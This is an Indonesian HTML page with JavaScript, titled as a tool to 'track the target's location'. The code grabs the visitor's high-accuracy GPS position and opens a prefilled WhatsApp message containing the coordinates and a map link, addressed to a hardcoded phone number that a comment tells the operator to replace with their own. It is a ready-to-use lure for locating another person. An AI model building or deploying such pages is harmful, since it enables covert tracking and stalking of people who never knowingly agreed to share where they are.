<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>dapatkan Lokasi Target</title>
<style>
*{margin:0; padding:0; box-sizing:border-box; font-family:system-ui}
body{background:#f0f4f8; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px}
.card{background:#fff; border-radius:16px; box-shadow:0 4px 20px rgba(0,0,0,.1); padding:30px; max-width:400px; width:100%; text-align:center}
h1{color:#075E54; margin-bottom:10px; font-size:22px}
p{color:#555; margin-bottom:25px; line-height:1.5}
.btn{display:inline-flex; align-items:center; justify-content:center; gap:10px; width:100%; padding:14px; border:none; border-radius:12px; font-size:17px; font-weight:600; cursor:pointer; transition:.3s; text-decoration:none}
.btn-primary{background:#25D366; color:#fff}
.btn-primary:hover{background:#1da855}
.status{margin-top:20px; padding:12px; border-radius:8px; display:none}
.loading{background:#e3f2fd; color:#0d47a1; display:block}
.success{background:#e8f5e9; color:#2e7d32; display:block}
.error{background:#ffebee; color:#c62828; display:block}
.map-link{margin-top:15px; display:none}
.map-link a{color:#075E54; font-weight:600; text-decoration:none}
</style>
</head>
<body>

<div class="card">
  <h1>📍 Lacak Lokasi Target</h1>
  <p>Klik tombol di bawah untuk mengirim lokasi Target ke WhatsApp.</p>
  
  <button class="btn btn-primary" id="getLocBtn">
    📍 Kirim Lokasi ke WhatsApp
  </button>
  
  <div class="status" id="statusBox"></div>
  <div class="map-link" id="mapBox"></div>
</div>

<script>
// === GANTI NOMOR INI DENGAN NOMOR WA KAMU ===
const NOMOR_WA = '6282196169652'; // pakai 62, tanpa tanda +

const getLocBtn = document.getElementById('getLocBtn');
const statusBox = document.getElementById('statusBox');
const mapBox = document.getElementById('mapBox');

getLocBtn.addEventListener('click', mulaiAmbilLokasi);

function mulaiAmbilLokasi(){
  if(!navigator.geolocation){
    tampilStatus('Perangkat tidak mendukung lokasi', 'error');
    return;
  }

  tampilStatus('Meminta akses lokasi... izinkan jika diminta', 'loading');
  getLocBtn.disabled = true;

  navigator.geolocation.getCurrentPosition(
    berhasilAmbilLokasi,
    gagalAmbilLokasi,
    {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
  );
}

function berhasilAmbilLokasi(posisi){
  const lat = posisi.coords.latitude;
  const lng = posisi.coords.longitude;
  const akurasi = Math.round(posisi.coords.accuracy);

  tampilStatus(`✅ Lokasi berhasil didapat! Akurasi: ${akurasi} meter`, 'success');

  // Buat pesan untuk WhatsApp
  const pesan = 
`📌 LOKASI DITERIMA
Lintang: ${lat}
Garis bujur: ${lng}
Akurasi: ±${akurasi} meter
Waktu: ${new Date().toLocaleString('id-ID')}
Buka di Peta: https://www.google.com/maps?q=${lat},${lng}`;

  // Buat link WhatsApp
  const waLink = `https://wa.me/${NOMOR_WA}?text=${encodeURIComponent(pesan)}`;

  // Tampilkan & buka
  mapBox.style.display = 'block';
  mapBox.innerHTML = `<a href="${waLink}" target="_blank">👉 Klik di sini kirim ke WhatsApp</a>`;
  
  // Buka otomatis WhatsApp
  window.open(waLink, '_blank');
  
  getLocBtn.disabled = false;
}

function gagalAmbilLokasi(err){
  let pesanError = 'Gagal mendapatkan lokasi. ';
  if(err.code === 1) pesanError += 'Anda menolak izin lokasi.';
  else if(err.code === 2) pesanError += 'Lokasi tidak tersedia.';
  else if(err.code === 3) pesanError += 'Waktu habis, coba lagi.';
  
  tampilStatus(pesanError, 'error');
  getLocBtn.disabled = false;
}

function tampilStatus(teks, jenis){
  statusBox.className = `status ${jenis}`;
  statusBox.textContent = teks;
}
</script>

</body>
</html>
